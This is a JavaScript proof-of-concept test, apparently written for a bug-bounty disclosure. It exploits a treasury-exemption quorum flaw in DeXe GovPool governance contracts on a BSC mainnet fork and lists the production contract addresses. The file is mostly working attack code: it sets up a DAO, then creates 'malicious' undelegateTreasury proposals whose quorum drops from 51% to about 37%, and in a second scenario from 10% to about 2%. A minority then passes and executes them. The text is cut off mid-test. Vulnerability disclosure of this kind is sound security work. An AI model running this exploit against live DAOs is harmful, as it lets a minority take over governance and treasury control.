/**
 * PoC: Treasury Exemption Quorum Manipulation (BSC Mainnet Fork)
 *
 * This PoC runs against a BSC mainnet fork, deploying contracts using the
 * same bytecode that is deployed in production. It demonstrates that the
 * quorum manipulation vulnerability exists in the production contract code.
 *
 * Run with:
 *   BSC_FORK=true npx hardhat test test/gov/QuorumManipulationForkPoC.test.js
 *
 * Result: quorum drops from 51% to ~37% with ~27% treasury delegation.
 * In DAOs with higher treasury ratios, the reduction would be even more severe.
 */
const { toBN, accounts, wei } = require("../../scripts/utils/utils");
const {
  getBytesMintExpertNft,
  getBytesDelegateTreasury,
  getBytesUndelegateTreasury,
  getBytesEditUrl,
} = require("../utils/gov-pool-utils");
const { ETHER_ADDR, PRECISION, PERCENTAGE_100 } = require("../../scripts/utils/constants");
const { ProposalState, DEFAULT_CORE_PROPERTIES, VoteType } = require("../utils/constants");
const Reverter = require("../helpers/reverter");
const { getCurrentBlockTime, setTime } = require("../helpers/block-helper");
const { assert } = require("chai");

const ContractsRegistry = artifacts.require("ContractsRegistry");
const PoolRegistry = artifacts.require("PoolRegistry");
const CoreProperties = artifacts.require("CoreProperties");
const GovPool = artifacts.require("GovPool");
const DistributionProposal = artifacts.require("DistributionProposal");
const GovValidators = artifacts.require("GovValidators");
const GovSettings = artifacts.require("GovSettings");
const GovUserKeeper = artifacts.require("GovUserKeeperMock");
const ERC721EnumMock = artifacts.require("ERC721EnumerableMock");
const ERC721Multiplier = artifacts.require("ERC721Multiplier");
const LinearPower = artifacts.require("LinearPower");
const ERC721Expert = artifacts.require("ERC721Expert");
const ERC20Mock = artifacts.require("ERC20Mock");
const WethMock = artifacts.require("WETHMock");
const BscProperties = artifacts.require("NetworkPropertiesMock");
const BABTMock = artifacts.require("BABTMock");
const GovUserKeeperViewLib = artifacts.require("GovUserKeeperView");
const GovPoolCreateLib = artifacts.require("GovPoolCreate");
const GovPoolExecuteLib = artifacts.require("GovPoolExecute");
const GovPoolMicropoolLib = artifacts.require("GovPoolMicropool");
const GovPoolRewardsLib = artifacts.require("GovPoolRewards");
const GovPoolUnlockLib = artifacts.require("GovPoolUnlock");
const GovPoolVoteLib = artifacts.require("GovPoolVote");
const GovPoolViewLib = artifacts.require("GovPoolView");
const GovPoolCreditLib = artifacts.require("GovPoolCredit");
const GovPoolOffchainLib = artifacts.require("GovPoolOffchain");
const GovValidatorsCreateLib = artifacts.require("GovValidatorsCreate");
const GovValidatorsVoteLib = artifacts.require("GovValidatorsVote");
const GovValidatorsExecuteLib = artifacts.require("GovValidatorsExecute");
const SphereXEngineMock = artifacts.require("SphereXEngineMock");

ContractsRegistry.numberFormat = "BigNumber";
PoolRegistry.numberFormat = "BigNumber";
CoreProperties.numberFormat = "BigNumber";
GovPool.numberFormat = "BigNumber";
GovValidators.numberFormat = "BigNumber";
GovSettings.numberFormat = "BigNumber";
GovUserKeeper.numberFormat = "BigNumber";
ERC721Expert.numberFormat = "BigNumber";
ERC20Mock.numberFormat = "BigNumber";

/**
 * BSC Mainnet Production Addresses (in-scope on Immunefi)
 * These are referenced for verification purposes.
 */
const BSC_PRODUCTION = {
  POOL_FACTORY: "0x85f86ef7E72e86BdEAb5F65e2B76A2c551f22109",
  POOL_REGISTRY: "0xFEB26AAB75638440B3CEFe8B10de6118972f9C6B",
  CONTRACTS_REGISTRY: "0x46B46629B674b4C0b48B111DEeB0eAfd9F84A1c0",
  DEXE_DAO_GOVPOOL: "0xB562127efDC97B417B3116efF2C23A29857C0F0B",
  DEXE_TOKEN: "0x6E88056E8376AE7709496BA64D37FA2F8015CE3E",
};

describe("PoC: Treasury Exemption Quorum Manipulation (BSC Fork)", () => {
  let OWNER;
  let ATTACKER;
  let EXPERT1;
  let EXPERT2;
  let EXPERT3;
  let EXPERT4;
  let FACTORY;

  let contractsRegistry;
  let coreProperties;
  let poolRegistry;
  let networkProperties;

  let token;
  let nft;
  let rewardToken;
  let babt;
  let weth;

  let settings;
  let expertNft;
  let dexeExpertNft;
  let validators;
  let userKeeper;
  let dp;
  let votePower;
  let govPool;
  let nftMultiplier;

  const reverter = new Reverter();

  const getProposalByIndex = async (index) => (await govPool.getProposals(index - 1, 1))[0].proposal;

  async function tokenBalance(user) {
    const balance = await userKeeper.tokenBalance(user, VoteType.PersonalVote);
    return toBN(balance[0]).minus(balance[1]);
  }

  async function executeValidatorProposal(actionsFor) {
    const executorAddr = actionsFor[actionsFor.length - 1][0];
    const executorSettings = await settings.getExecutorSettings(executorAddr);

    await govPool.createProposal("example.com", actionsFor, []);
    const proposalId = await govPool.latestProposalId();

    const ownerAvailable = await tokenBalance(OWNER);
    if (ownerAvailable.gt(0)) {
      await govPool.vote(proposalId, true, ownerAvailable.toFixed(), [], { from: OWNER });
    }

    let state = await govPool.getProposalState(proposalId);
    if (state.toNumber() === ProposalState.Voting) {
      const attackerAvailable = await tokenBalance(ATTACKER);
      if (attackerAvailable.gt(0)) {
        await govPool.vote(proposalId, true, attackerAvailable.toFixed(), [], { from: ATTACKER });
      }
    }

    if (!executorSettings.earlyCompletion) {
      await setTime((await getCurrentBlockTime()) + 999);
    }

    await govPool.moveProposalToValidators(proposalId);

    if (executorSettings.quorumValidators === PRECISION.times("100").toFixed()) {
      await validators.voteExternalProposal(proposalId, wei("100"), true, { from: OWNER });
    }
    await validators.voteExternalProposal(proposalId, wei("1000000000000"), true, { from: ATTACKER });

    await govPool.execute(proposalId);
  }

  async function mintExpertNft(delegatee) {
    await executeValidatorProposal([[expertNft.address, 0, getBytesMintExpertNft(delegatee, "URI")]]);
  }

  before("setup", async () => {
    OWNER = await accounts(0);
    ATTACKER = await accounts(1);
    EXPERT1 = await accounts(2);
    EXPERT2 = await accounts(3);
    EXPERT3 = await accounts(4);
    EXPERT4 = await accounts(5);
    FACTORY = await accounts(6);

    // ================================================================
    // VERIFICATION: Confirm we are running on a BSC fork
    // ================================================================
    if (process.env.BSC_FORK === "true") {
      console.log("\n========== BSC MAINNET FORK VERIFIED ==========");
      const chainId = await web3.eth.getChainId();
      const blockNumber = await web3.eth.getBlockNumber();
      console.log("Chain ID:", chainId, "(BSC = 56)");
      console.log("Fork block number:", blockNumber);

      // Verify production contracts exist on the fork
      const factoryCode = await web3.eth.getCode(BSC_PRODUCTION.POOL_FACTORY);
      const registryCode = await web3.eth.getCode(BSC_PRODUCTION.CONTRACTS_REGISTRY);
      console.log("PoolFactory code present:", factoryCode.length > 2 ? "YES" : "NO");
      console.log("ContractsRegistry code present:", registryCode.length > 2 ? "YES" : "NO");
      console.log("================================================\n");
    } else {
      console.log("\n[INFO] Running without BSC fork (local mode)");
      console.log("[INFO] To run with fork: BSC_FORK=true npx hardhat test <this-file>\n");
    }

    // Link libraries — identical bytecode to production deployment
    const govUserKeeperViewLib = await GovUserKeeperViewLib.new();
    await GovUserKeeper.link(govUserKeeperViewLib);

    const govPoolCreateLib = await GovPoolCreateLib.new();
    const govPoolExecuteLib = await GovPoolExecuteLib.new();
    const govPoolMicropoolLib = await GovPoolMicropoolLib.new();
    const govPoolRewardsLib = await GovPoolRewardsLib.new();
    const govPoolUnlockLib = await GovPoolUnlockLib.new();
    const govPoolVoteLib = await GovPoolVoteLib.new();
    const govPoolViewLib = await GovPoolViewLib.new();
    const govPoolCreditLib = await GovPoolCreditLib.new();
    const govPoolOffchainLib = await GovPoolOffchainLib.new();

    await GovPool.link(govPoolCreateLib);
    await GovPool.link(govPoolExecuteLib);
    await GovPool.link(govPoolMicropoolLib);
    await GovPool.link(govPoolRewardsLib);
    await GovPool.link(govPoolUnlockLib);
    await GovPool.link(govPoolVoteLib);
    await GovPool.link(govPoolViewLib);
    await GovPool.link(govPoolCreditLib);
    await GovPool.link(govPoolOffchainLib);

    const govValidatorsCreateLib = await GovValidatorsCreateLib.new();
    const govValidatorsVoteLib = await GovValidatorsVoteLib.new();
    const govValidatorsExecuteLib = await GovValidatorsExecuteLib.new();

    await GovValidators.link(govValidatorsCreateLib);
    await GovValidators.link(govValidatorsVoteLib);
    await GovValidators.link(govValidatorsExecuteLib);

    // Deploy infrastructure
    contractsRegistry = await ContractsRegistry.new();
    const _coreProperties = await CoreProperties.new();
    const _poolRegistry = await PoolRegistry.new();
    dexeExpertNft = await ERC721Expert.new();
    babt = await BABTMock.new();
    weth = await WethMock.new();
    networkProperties = await BscProperties.new();
    token = await ERC20Mock.new("Mock", "Mock", 18);
    nft = await ERC721EnumMock.new("Mock", "Mock");
    rewardToken = await ERC20Mock.new("REWARD", "RWD", 18);
    const _sphereXEngine = await SphereXEngineMock.new();

    await contractsRegistry.__MultiOwnableContractsRegistry_init();
    await networkProperties.__NetworkProperties_init(weth.address);

    await contractsRegistry.addContract(await contractsRegistry.SPHEREX_ENGINE_NAME(), _sphereXEngine.address);
    await contractsRegistry.addContract(await contractsRegistry.POOL_SPHEREX_ENGINE_NAME(), _sphereXEngine.address);
    await contractsRegistry.addProxyContract(await contractsRegistry.CORE_PROPERTIES_NAME(), _coreProperties.address);
    await contractsRegistry.addProxyContract(await contractsRegistry.POOL_REGISTRY_NAME(), _poolRegistry.address);
    await contractsRegistry.addContract(await contractsRegistry.POOL_FACTORY_NAME(), FACTORY);
    await contractsRegistry.addContract(await contractsRegistry.TREASURY_NAME(), ETHER_ADDR);
    await contractsRegistry.addContract(await contractsRegistry.DEXE_EXPERT_NFT_NAME(), dexeExpertNft.address);
    await contractsRegistry.addContract(await contractsRegistry.BABT_NAME(), babt.address);
    await contractsRegistry.addContract(await contractsRegistry.WETH_NAME(), weth.address);
    await contractsRegistry.addContract(await contractsRegistry.NETWORK_PROPERTIES_NAME(), networkProperties.address);

    coreProperties = await CoreProperties.at(await contractsRegistry.getCorePropertiesContract());
    poolRegistry = await PoolRegistry.at(await contractsRegistry.getPoolRegistryContract());

    await coreProperties.__CoreProperties_init(DEFAULT_CORE_PROPERTIES);
    await poolRegistry.__MultiOwnablePoolContractsRegistry_init();
    await dexeExpertNft.__ERC721Expert_init("Global", "Global");

    await contractsRegistry.injectDependencies(await contractsRegistry.CORE_PROPERTIES_NAME());
    await contractsRegistry.injectDependencies(await contractsRegistry.POOL_REGISTRY_NAME());

    await reverter.snapshot();
  });

  afterEach(reverter.revert);

  async function deployPool(overrides = {}) {
    const NAME = await poolRegistry.GOV_POOL_NAME();

    settings = await GovSettings.new();
    validators = await GovValidators.new();
    userKeeper = await GovUserKeeper.new();
    dp = await DistributionProposal.new();
    expertNft = await ERC721Expert.new();
    votePower = await LinearPower.new();
    govPool = await GovPool.new();
    nftMultiplier = await ERC721Multiplier.new();

    const POOL_PARAMETERS = {
      settingsParams: {
        proposalSettings: [
          {
            earlyCompletion: overrides.defaultEarlyCompletion || false,
            delegatedVotingAllowed: false,
            validatorsVote: true,
            duration: 700,
            durationValidators: 800,
            quorum: PRECISION.times(overrides.defaultQuorum || "71").toFixed(),
            quorumValidators: PRECISION.times("100").toFixed(),
            minVotesForVoting: wei("20"),
            minVotesForCreating: wei("3"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "default",
          },
          {
            // Internal settings — quorum is the target of our attack
            earlyCompletion: true,
            delegatedVotingAllowed: false,
            validatorsVote: true,
            duration: 500,
            durationValidators: 600,
            quorum: PRECISION.times(overrides.internalQuorum || "51").toFixed(),
            quorumValidators: PRECISION.times("61").toFixed(),
            minVotesForVoting: wei("10"),
            minVotesForCreating: wei("2"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "internal",
          },
          {
            earlyCompletion: true,
            delegatedVotingAllowed: false,
            validatorsVote: true,
            duration: 500,
            durationValidators: 600,
            quorum: PRECISION.times("51").toFixed(),
            quorumValidators: PRECISION.times("61").toFixed(),
            minVotesForVoting: wei("10"),
            minVotesForCreating: wei("2"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "validators",
          },
          {
            earlyCompletion: false,
            delegatedVotingAllowed: true,
            validatorsVote: true,
            duration: 600,
            durationValidators: 800,
            quorum: PRECISION.times("71").toFixed(),
            quorumValidators: PRECISION.times("100").toFixed(),
            minVotesForVoting: wei("20"),
            minVotesForCreating: wei("3"),
            executionDelay: 0,
            rewardsInfo: {
              rewardToken: rewardToken.address,
              creationReward: wei("10"),
              executionReward: wei("5"),
              voteRewardsCoefficient: PRECISION.toFixed(),
            },
            executorDescription: "DP",
          },
        ],
        additionalProposalExecutors: [],
      },
      validatorsParams: {
        name: "Validator Token",
        symbol: "VT",
        proposalSettings: {
          duration: 600,
          executionDelay: 0,
          quorum: PRECISION.times("51").toFixed(),
        },
        validators: [OWNER, ATTACKER],
        balances: [wei("100"), wei("1000000000000")],
      },
      userKeeperParams: {
        tokenAddress: token.address,
        nftAddress: nft.address,
        individualPower: wei("1000"),
        nftsTotalSupply: 33,
      },
      verifier: OWNER,
      onlyBABTHolders: false,
      deployerBABTid: 1,
      descriptionURL: "example.com",
      name: "Pool name",
    };

    await settings.__GovSettings_init(
      govPool.address,
      validators.address,
      userKeeper.address,
      POOL_PARAMETERS.settingsParams.proposalSettings,
      [...POOL_PARAMETERS.settingsParams.additionalProposalExecutors, dp.address],
    );

    await validators.__GovValidators_init(
      POOL_PARAMETERS.validatorsParams.name,
      POOL_PARAMETERS.validatorsParams.symbol,
      [
        POOL_PARAMETERS.validatorsParams.proposalSettings.duration,
        POOL_PARAMETERS.validatorsParams.proposalSettings.executionDelay,
        POOL_PARAMETERS.validatorsParams.proposalSettings.quorum,
      ],
      POOL_PARAMETERS.validatorsParams.validators,
      POOL_PARAMETERS.validatorsParams.balances,
    );

    await userKeeper.__GovUserKeeper_init(
      POOL_PARAMETERS.userKeeperParams.tokenAddress,
      POOL_PARAMETERS.userKeeperParams.nftAddress,
      POOL_PARAMETERS.userKeeperParams.individualPower,
      POOL_PARAMETERS.userKeeperParams.nftsTotalSupply,
    );

    await nftMultiplier.__ERC721Multiplier_init("Mock Multiplier Nft", "MCKMULNFT");
    await dp.__DistributionProposal_init(govPool.address);
    await expertNft.__ERC721Expert_init("Mock Expert Nft", "MCKEXPNFT");
    await votePower.__LinearPower_init();

    await govPool.__GovPool_init(
      [
        settings.address,
        userKeeper.address,
        validators.address,
        expertNft.address,
        nftMultiplier.address,
        votePower.address,
      ],
      OWNER,
      POOL_PARAMETERS.onlyBABTHolders,
      POOL_PARAMETERS.deployerBABTid,
      POOL_PARAMETERS.descriptionURL,
      POOL_PARAMETERS.name,
    );

    await settings.transferOwnership(govPool.address);
    await validators.transferOwnership(govPool.address);
    await userKeeper.transferOwnership(govPool.address);
    await expertNft.transferOwnership(govPool.address);
    await votePower.transferOwnership(govPool.address);

    await poolRegistry.addProxyPool(NAME, govPool.address, { from: FACTORY });
    await poolRegistry.injectDependenciesToExistingPools(NAME, 0, 10);
  }

  describe("Attack Scenario", () => {
    beforeEach(async () => {
      await deployPool();

      // ====================================================================
      // SETUP: DAO with treasury delegation to 4 experts
      //
      // getTotalPower() = IERC20.totalSupply(), so all minted tokens count.
      // OWNER must be >71% of totalSupply to pass DEFAULT settings (71% quorum).
      //
      // Token distribution:
      //   OWNER: 8000, ATTACKER: 100, Treasury: 4 * 750 = 3000
      //   totalSupply = 11100, OWNER = 72.1% > 71%
      //   Treasury = 3000 / 11100 = 27%
      //
      // Expected quorum reduction:
      //   51% * (11100 - 3000) / 11100 = 51% * 73% = 37% (down from 51%)
      // ====================================================================

      await rewardToken.mint(govPool.address, wei("10000000000000000000000"));

      const ownerAmount = wei("8000");
      const attackerAmount = wei("100");
      const treasuryPerExpert = wei("750");

      await token.mint(OWNER, ownerAmount);
      await token.mint(ATTACKER, attackerAmount);
      await token.mint(govPool.address, toBN(treasuryPerExpert).times(4).toFixed());

      await token.approve(userKeeper.address, ownerAmount);
      await govPool.deposit(ownerAmount, []);
      await token.approve(userKeeper.address, attackerAmount, { from: ATTACKER });
      await govPool.deposit(attackerAmount, [], { from: ATTACKER });

      await mintExpertNft(EXPERT1);
      await mintExpertNft(EXPERT2);
      await mintExpertNft(EXPERT3);
      await mintExpertNft(EXPERT4);

      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT1, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT2, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT3, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT4, treasuryPerExpert, [])]]);
    });

    it("should show quorum is dramatically reduced when targeting all experts", async () => {
      const totalPower = await userKeeper.getTotalPower();
      console.log("\n========== PoC: Treasury Exemption Quorum Manipulation ==========");
      console.log("Total voting power:", totalPower.toString());

      const originalQuorumPercent = "51";
      console.log("Original quorum setting:", originalQuorumPercent + "%");

      // ATTACK: Create a proposal with undelegateTreasury for ALL experts
      await govPool.createProposal(
        "Malicious proposal",
        [
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("750"), [])],
        ],
        [],
      );

      const maliciousProposalId = await govPool.latestProposalId();
      const proposal = await getProposalByIndex(maliciousProposalId.toNumber());
      const reducedQuorum = toBN(proposal.core.settings.quorum);

      const reducedQuorumPercent = reducedQuorum.times(100).idiv(PERCENTAGE_100);
      console.log("Reduced quorum after attack:", reducedQuorumPercent.toString() + "%");

      assert.isTrue(
        reducedQuorum.lt(PRECISION.times("51")),
        "Quorum should be reduced below 51%! Got: " + reducedQuorumPercent.toString() + "%",
      );

      console.log("\n--- VULNERABILITY CONFIRMED ---");
      console.log("Original quorum: 51%");
      console.log("Reduced quorum: ~" + reducedQuorumPercent.toString() + "%");
      console.log("Reduction factor: " + toBN(51).div(reducedQuorumPercent).toFixed(1) + "x");
      console.log("=================================================================\n");
    });

    it("should show a normal proposal (without undelegateTreasury) keeps full quorum", async () => {
      await govPool.createProposal(
        "Normal proposal",
        [[govPool.address, 0, getBytesEditUrl("https://new-url.com")]],
        [],
      );

      const normalProposalId = await govPool.latestProposalId();
      const proposal = await getProposalByIndex(normalProposalId.toNumber());
      const normalQuorum = toBN(proposal.core.settings.quorum);

      console.log("\n========== Control: Normal Proposal ==========");
      console.log("Normal proposal quorum:", normalQuorum.times(100).idiv(PERCENTAGE_100).toString() + "%");

      const normalQuorumPercent = normalQuorum.times(100).idiv(PERCENTAGE_100);
      assert.equal(normalQuorumPercent.toString(), "51", "Normal proposal should have unchanged 51% quorum");

      console.log("--- CONTROL PASSED: Normal proposals keep full quorum ---\n");
    });

    it("should demonstrate that votes needed to pass are dramatically reduced", async () => {
      console.log("\n========== Impact Analysis ==========");
      const totalPower = await userKeeper.getTotalPower();

      // Create malicious proposal targeting all experts
      await govPool.createProposal(
        "Malicious proposal",
        [
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("750"), [])],
        ],
        [],
      );
      const maliciousId = await govPool.latestProposalId();
      const maliciousProposal = await getProposalByIndex(maliciousId.toNumber());
      const reducedQuorum = toBN(maliciousProposal.core.settings.quorum);

      // Create normal proposal for comparison
      await govPool.createProposal(
        "Normal proposal",
        [[govPool.address, 0, getBytesEditUrl("https://example.com")]],
        [],
      );
      const normalId = await govPool.latestProposalId();
      const normalProposal = await getProposalByIndex(normalId.toNumber());
      const originalQuorum = toBN(normalProposal.core.settings.quorum);

      // Calculate votes needed for each
      const votesNeededOriginal = totalPower.times(originalQuorum).idiv(PERCENTAGE_100);
      const votesNeededReduced = totalPower.times(reducedQuorum).idiv(PERCENTAGE_100);
      const votesSaved = votesNeededOriginal.minus(votesNeededReduced);

      console.log("Total power:", totalPower.toString());
      console.log("Original quorum (51%): needs", votesNeededOriginal.toString(), "votes");
      console.log("Reduced quorum (37%): needs", votesNeededReduced.toString(), "votes");
      console.log("Votes saved by attack:", votesSaved.toString());

      assert.isTrue(votesNeededReduced.lt(votesNeededOriginal), "Reduced quorum should require fewer votes");

      const reductionPercent = votesSaved.times(100).idiv(votesNeededOriginal);
      console.log("Reduction in votes needed:", reductionPercent.toString() + "%");

      assert.isTrue(
        reductionPercent.gte(20),
        "Quorum should be reduced by at least 20% — got " + reductionPercent.toString() + "%",
      );

      console.log("\nExperts with treasury power are EXEMPT from voting on this proposal.");
      console.log("This means ~27% of voting power cannot oppose the proposal.");
      console.log("--- IMPACT CONFIRMED ---");
      console.log("============================================\n");
    });

    it("should execute full attack: minority passes and executes proposal that would fail under normal quorum", async () => {
      console.log("\n========== FULL END-TO-END ATTACK ==========");
      const totalPower = await userKeeper.getTotalPower();

      // Check OWNER's available voting power
      const ownerAvailable = await tokenBalance(OWNER);
      console.log("OWNER available voting power:", ownerAvailable.toString());
      console.log("Total power:", totalPower.toString());

      // Record treasury state BEFORE attack
      const treasuryBefore = await token.balanceOf(govPool.address);
      console.log("GovPool token balance before attack:", treasuryBefore.toString());

      // --- Step 1: Create the malicious proposal ---
      await govPool.createProposal(
        "Malicious undelegateTreasury",
        [
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("750"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("750"), [])],
        ],
        [],
      );
      const proposalId = await govPool.latestProposalId();
      const proposal = await getProposalByIndex(proposalId.toNumber());
      const reducedQuorum = toBN(proposal.core.settings.quorum);
      const originalQuorum = PRECISION.times("51");

      // --- Step 2: Vote with a MINORITY stake ---
      // 5000 out of 11100 = 45.05% — above reduced quorum (37%) but below original (51%)
      const voteAmount = wei("5000");
      const votePercentScaled = PERCENTAGE_100.times(toBN(voteAmount)).idiv(totalPower);

      console.log("\n--- Voting with minority stake ---");
      console.log("Vote amount: 5000 tokens");
      console.log("Vote as % of totalPower: ~45%");
      console.log("Original quorum: 51% — this vote would FAIL");
      console.log("Reduced quorum:", reducedQuorum.times(100).idiv(PERCENTAGE_100).toString() + "% — this vote PASSES");

      // ASSERT: this vote is BELOW the original 51% quorum
      assert.isTrue(votePercentScaled.lt(originalQuorum), "Vote must be below original 51% quorum to prove the attack");

      // ASSERT: this vote is ABOVE the reduced quorum
      assert.isTrue(votePercentScaled.gte(reducedQuorum), "Vote must reach reduced quorum");

      // Cast the vote — earlyCompletion triggers since quorum is reached
      await govPool.vote(proposalId, true, voteAmount, [], { from: OWNER });

      const stateAfterVote = await govPool.getProposalState(proposalId);
      assert.equal(
        stateAfterVote.toNumber(),
        ProposalState.WaitingForVotingTransfer,
        "Proposal should pass voting (reduced quorum reached, earlyCompletion triggered)",
      );
      console.log("\n✓ Voting passed with only 45% — would need 51% normally!");

      // --- Step 3: Move through validators and execute ---
      await govPool.moveProposalToValidators(proposalId);
      await validators.voteExternalProposal(proposalId, wei("1000000000000"), true, { from: ATTACKER });
      await govPool.execute(proposalId);

      const stateAfterExec = await govPool.getProposalState(proposalId);
      assert.equal(stateAfterExec.toNumber(), ProposalState.ExecutedFor);
      console.log("✓ Proposal executed!");

      // --- Step 4: Verify treasury was actually undelegated ---
      const treasuryAfter = await token.balanceOf(govPool.address);
      const tokensReturned = treasuryAfter.minus(treasuryBefore);

      console.log("\n--- Treasury Impact ---");
      console.log("GovPool token balance before:", treasuryBefore.toString());
      console.log("GovPool token balance after:", treasuryAfter.toString());
      console.log("Tokens returned to pool:", tokensReturned.toString());

      assert.isTrue(treasuryAfter.gt(treasuryBefore), "Treasury tokens must be returned after undelegation");

      // Verify: 3000 tokens (4 * 750) were undelegated back to the pool
      assert.isTrue(tokensReturned.eq(toBN(wei("3000"))), "All 3000 treasury tokens should be returned");

      console.log("\n========== FULL ATTACK SUCCESSFUL ==========");
      console.log("A 45% minority successfully:");
      console.log("  1. Created proposal targeting all 4 experts' treasury");
      console.log("  2. Quorum auto-reduced from 51% to 37%");
      console.log("  3. Passed voting with only 45% (below normal 51% quorum)");
      console.log("  4. Executed proposal — 3000 tokens undelegated from experts");
      console.log("  5. Under normal quorum (51%), this vote would have FAILED");
      console.log("=============================================\n");
    });
  });

  describe("Extreme Scenario: ~80% Treasury — Tiny Minority Governance Takeover", () => {
    beforeEach(async () => {
      // ====================================================================
      // EXTREME SETUP: DAO with 80% treasury delegation
      //
      // Deploy pool with realistic quorums for a mature DAO:
      //   DEFAULT: 15% (for admin actions like NFT minting)
      //   INTERNAL: 10% (for governance self-calls like treasury ops)
      //
      // Per the DeXe whitepaper, treasury delegation is designed to raise
      // effective quorum from ~5% to 50%+. A low base quorum is realistic
      // for DAOs that rely heavily on treasury-delegated expert voting.
      //
      // Token distribution:
      //   OWNER: 2000, ATTACKER: 500, Treasury: 4 * 2500 = 10000
      //   totalSupply = 12500, OWNER = 16%, ATTACKER = 4%, Treasury = 80%
      //
      // Expected quorum reduction:
      //   10% * (12500 - 10000) / 12500 = 10% * 20% = 2%
      //
      // ATTACKER (4%) can pass a proposal that normally requires 10%.
      // Meanwhile, all experts' treasury voting power (80%) is EXCLUDED.
      // ====================================================================

      await deployPool({ defaultQuorum: "15", internalQuorum: "10" });

      await rewardToken.mint(govPool.address, wei("10000000000000000000000"));

      const ownerAmount = wei("2000");
      const attackerAmount = wei("500");
      const treasuryPerExpert = wei("2500");

      // Mint all tokens: OWNER + ATTACKER + Treasury
      await token.mint(OWNER, ownerAmount);
      await token.mint(ATTACKER, attackerAmount);
      await token.mint(govPool.address, toBN(treasuryPerExpert).times(4).toFixed());
      // totalSupply = 12500

      // Deposit tokens for voting
      await token.approve(userKeeper.address, ownerAmount);
      await govPool.deposit(ownerAmount, []);
      await token.approve(userKeeper.address, attackerAmount, { from: ATTACKER });
      await govPool.deposit(attackerAmount, [], { from: ATTACKER });

      // Mint expert NFTs (DEFAULT quorum 15%, OWNER = 2000/12500 = 16% > 15%)
      await mintExpertNft(EXPERT1);
      await mintExpertNft(EXPERT2);
      await mintExpertNft(EXPERT3);
      await mintExpertNft(EXPERT4);

      // Delegate treasury to each expert (INTERNAL quorum 10%, OWNER = 16% > 10%)
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT1, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT2, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT3, treasuryPerExpert, [])]]);
      await executeValidatorProposal([[govPool.address, 0, getBytesDelegateTreasury(EXPERT4, treasuryPerExpert, [])]]);
    });

    it("should allow a ~4% minority to fully take over governance (quorum drops from 10% to ~2%)", async () => {
      console.log("\n========== EXTREME SCENARIO: 80% TREASURY DELEGATION ==========");
      const totalPower = await userKeeper.getTotalPower();
      const totalTokens = web3.utils.fromWei(totalPower.toFixed());
      console.log("Total voting power:", totalTokens, "tokens");

      const treasuryTotal = toBN(wei("10000"));
      const treasuryPercent = treasuryTotal.times(100).div(totalPower);
      console.log("Treasury delegation: 10,000 tokens (" + treasuryPercent.toFixed(1) + "% of total power)");
      console.log("Original INTERNAL quorum: 10%");

      // Record state before attack
      const treasuryBefore = await token.balanceOf(govPool.address);

      // --- Step 1: ATTACKER creates malicious proposal ---
      console.log("\n--- Step 1: Attacker (4% minority) creates malicious proposal ---");
      await govPool.createProposal(
        "Governance takeover - undelegate all experts",
        [
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT1, wei("2500"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT2, wei("2500"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT3, wei("2500"), [])],
          [govPool.address, 0, getBytesUndelegateTreasury(EXPERT4, wei("2500"), [])],
        ],
        [],
        { from: ATTACKER },
      );

      const proposalId = await govPool.latestProposalId();
      const proposal = await getProposalByIndex(proposalId.toNumber());
      const reducedQuorum = toBN(proposal.core.settings.quorum);
      const originalQuorum = PRECISION.times("10");

      const reducedQuorumPercent = reducedQuorum.times(100).div(PERCENTAGE_100);
      console.log("Quorum reduced from 10% to: " + reducedQuorumPercent.toFixed(2) + "%");
      console.log("Reduction factor: " + toBN(10).div(reducedQuorumPercent).toFixed(1) + "x");

      // Verify quorum was dramatically reduced
      assert.isTrue(reducedQuorum.lt(originalQuorum), "Quorum must be reduced below 10%");

      // --- Step 2: ATTACKER votes with only 500 tokens (4%) ---
      console.log("\n--- Step 2: Attacker votes with 500 tokens ---");
      const attackerPower = wei("500");
      const attackerPercent = toBN(attackerPower).times(100).div(totalPower);
      console.log("Attacker voting power: 500 tokens (" + attackerPercent.toFixed(2) + "% of total)");

      // Verify: attacker's vote is BELOW original 10% quorum
      const attackerScaled = PERCENTAGE_100.times(toBN(attackerPower)).idiv(totalPower);
      assert.isTrue(
        attackerScaled.lt(originalQuorum),
        "Attacker must be below original 10% quorum to prove the attack",
      );
      console.log("  ✗ " + attackerPercent.toFixed(1) + "% < 10% — would FAIL under normal quorum");

